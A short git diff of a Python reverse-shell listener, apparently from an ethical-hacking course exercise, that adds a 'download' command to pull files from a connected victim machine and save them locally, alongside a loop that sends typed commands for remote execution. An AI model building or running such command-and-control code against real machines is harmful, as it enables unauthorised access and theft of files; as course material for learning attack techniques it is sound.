@@ -37,11 +37,21 @@ class SocketListener:
             exit()
         return self.json_receive()
 
+    # Saving file
+    def save_file(self,path,content):
+        with open(path,"wb") as my_file:
+            my_file.write(content)
+            return "Download completed successfully"
+
     def start_listener(self):
         while True:
             command_input = raw_input("Windows C:\\User\\IEUser\\> ")
             command_input = command_input.split(" ")
             command_output = self.command_execution(command_input).decode()
+
+            if command_input[0] == "download":
+                command_output = self.save_file(command_input[1],command_output)
+
             print(command_output)
 
 socket_listener = SocketListener("10.0.2.10",8080)
